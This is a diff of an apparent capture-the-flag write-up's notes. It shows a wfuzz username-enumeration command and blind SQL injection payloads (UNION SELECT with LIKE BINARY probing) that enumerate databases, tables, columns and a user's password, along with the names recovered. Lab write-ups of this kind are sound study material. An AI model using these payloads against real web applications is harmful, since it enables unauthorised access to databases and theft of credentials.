@@ -37,20 +37,18 @@ wfuzz --hh 1147 -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt  -
 
 => 4 columns
 
-#### DB
+#### DB (bf_databases.py)
 
 ```sql
 ' UNION SELECT 1,2,3,4 FROM information_schema.schemata WHERE schema_name LIKE BINARY "a%"-- -
 ```
 
-- bf_databases.py
+- devsite
+- information_schema
+- mywebsite
+- performance_schema
 
-    - devsite
-    - information_schema
-    - mywebsite
-    - performance_schema
-
-#### TABLES
+#### TABLES (bf_tables.py)
 
 ```sql
 ' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = 'mywebsite' AND table_name LIKE BINARY 'u%'-- -
@@ -62,7 +60,7 @@ For mywebsite:
 For devsite:
 - siteusers
 
-#### COLUMNS
+#### COLUMNS (bf_columns.py)
 
 ```sql
 ' UNION SELECT 1,2,3,4 FROM information_schema.COLUMNS WHERE table_schema = 'mywebsite' AND table_name = 'siteusers' AND COLUMN_NAME LIKE BINARY 'u%'-- -
@@ -80,7 +78,7 @@ For devsite:
 - password
 - username
 
-#### PASSWORD
+#### PASSWORD (bf_password.py)
 
 ```sql
 ' UNION SELECT 1,2,3,4 FROM siteusers WHERE username = 'kitty' AND password LIKE BINARY '{result}{char}%'-- -
